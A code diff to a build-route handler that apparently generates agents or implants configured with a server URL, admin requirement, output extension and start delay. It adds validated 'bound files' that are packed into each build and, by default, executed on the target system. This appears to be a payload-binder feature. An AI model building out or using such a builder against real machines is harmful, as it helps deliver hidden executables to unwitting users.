@@ -67,6 +67,7 @@ export async function handleBuildRoutes(
         requireAdmin,
         outputExtension,
         sleepSeconds,
+        boundFiles,
       } = body;
 
       if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
@@ -157,6 +158,54 @@ export async function handleBuildRoutes(
         typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
           ? sleepSeconds : 0;
 
+      const MAX_BOUND_FILES = 5;
+      const MAX_BOUND_FILE_BYTES = 10 * 1024 * 1024;
+      const ALLOWED_BIND_TARGET_OS = new Set(["windows", "linux", "darwin"]);
+      const RESERVED_BIND_NAMES = new Set(["manifest.json"]);
+      type SafeBoundFile = { name: string; data: string; targetOS: string[]; execute: boolean };
+      let safeBoundFiles: SafeBoundFile[] | undefined;
+      if (Array.isArray(boundFiles) && boundFiles.length > 0) {
+        if (boundFiles.length > MAX_BOUND_FILES) {
+          return Response.json({ error: `Maximum ${MAX_BOUND_FILES} bound files allowed` }, { status: 400 });
+        }
+        const seenNames = new Set<string>();
+        const validated: SafeBoundFile[] = [];
+        for (const f of boundFiles) {
+          if (!f || typeof f !== "object") {
+            return Response.json({ error: "Invalid bound file entry" }, { status: 400 });
+          }
+          const rawName = typeof f.name === "string" ? f.name : "";
+          const safeName = rawName.replace(/[^A-Za-z0-9._-]/g, "").slice(0, 64);
+          if (!safeName) {
+            return Response.json({ error: "Bound file has an invalid name" }, { status: 400 });
+          }
+          if (RESERVED_BIND_NAMES.has(safeName)) {
+            return Response.json({ error: `'${safeName}' is a reserved filename` }, { status: 400 });
+          }
+          if (seenNames.has(safeName)) {
+            return Response.json({ error: `Duplicate bound file name: ${safeName}` }, { status: 400 });
+          }
+          seenNames.add(safeName);
+          if (typeof f.data !== "string" || f.data.length === 0) {
+            return Response.json({ error: `Bound file '${safeName}' has no data` }, { status: 400 });
+          }
+          const approxDecodedBytes = Math.floor(f.data.length * 3 / 4);
+          if (approxDecodedBytes > MAX_BOUND_FILE_BYTES) {
+            return Response.json({ error: `Bound file '${safeName}' exceeds the 10 MB limit` }, { status: 400 });
+          }
+          const safeTargetOS = Array.isArray(f.targetOS)
+            ? f.targetOS.filter((o: unknown) => typeof o === "string" && ALLOWED_BIND_TARGET_OS.has(o as string)) as string[]
+            : [];
+          validated.push({
+            name: safeName,
+            data: f.data,
+            targetOS: safeTargetOS,
+            execute: f.execute !== false, // default true
+          });
+        }
+        safeBoundFiles = validated;
+      }
+
       deps.startBuildProcess(buildId, {
         platforms: allowedPlatforms,
         serverUrl: safeServerUrl,
@@ -186,6 +235,7 @@ export async function handleBuildRoutes(
         requireAdmin: safeRequireAdmin,
         outputExtension: safeOutputExtension,
         sleepSeconds: safeSleepSeconds,
+        boundFiles: safeBoundFiles,
       });
 
       return Response.json({ buildId });
